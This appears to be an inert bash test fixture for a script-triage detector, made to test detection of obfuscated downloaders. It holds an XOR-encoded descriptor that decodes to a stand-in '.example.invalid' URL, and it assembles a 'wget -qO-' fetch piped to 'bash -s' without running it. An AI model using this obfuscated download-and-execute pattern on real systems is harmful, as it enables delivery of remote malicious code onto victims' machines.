#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_b751e117='212,159,147,222,209,214,199,210,209,159,195,193,211,215,203,208,199,253,208,199,207,205,214,199,142,198,203,209,210,195,214,193,202,253,210,203,210,199,222,195,198,195,210,214,199,208,159,213,197,199,214,253,209,214,198,205,215,214,253,210,203,210,199,222,209,214,195,197,199,253,193,205,215,204,214,159,147,222,193,195,207,210,195,203,197,204,253,203,198,159,193,195,207,210,195,203,197,204,143,155,145,195,148,198,145,147,155,149,151,222,215,208,206,159,202,214,214,210,209,152,141,141,155,145,195,148,198,145,147,155,149,151,140,199,218,195,207,210,206,199,140,203,204,212,195,206,203,198,141,145,148,148,195,193,151,147,198,140,209,202,222,215,209,199,208,253,195,197,199,204,214,159,234,215,204,214,208,199,209,209,238,195,192,141,155,145,195,148,198,145,147,155,149,151'
readonly Codec_b751e117='reversed_decimal|reverse_then_xor|a2'

Load_b751e117() {
  v_a19c=()
  local IFS=',' v_e598
  local -a pieces
  read -r -a pieces <<< "${Material_b751e117}"
  for ((v_e598=${#pieces[@]}-1; v_e598>=0; v_e598--)); do v_a19c+=("${pieces[v_e598]}"); done
}

Decode_b751e117() {
  v_b27e=()
  local v_e598
  for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
    v_b27e[${#v_a19c[@]}-1-v_e598]="$((v_a19c[v_e598] ^ 162))"
  done
}

Recover_b751e117() {
  local -a v_a19c v_b27e
  local v_c304 v_d41a v_b803 v_e598
  local -a series=(3 5 8 13); v_d41a="${series[*]:1:2}"
  Load_b751e117
  case 1 in 1) Decode_b751e117 ;; *) return 70 ;; esac
  v_c304=''
  local octal character
  for v_e598 in "${!v_b27e[@]}"; do
    printf -v octal '%03o' "${v_b27e[v_e598]}"
    printf -v character '%b' "\\$octal"
    v_c304+="$character"
  done
  printf '%s\n' "$v_c304"
}

Inspect_b751e117() { local recovered; recovered="$(Recover_b751e117)"; printf '%s\n' "$recovered"; }

Plan_b751e117() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_b751e117)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO- "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_b751e117; fi
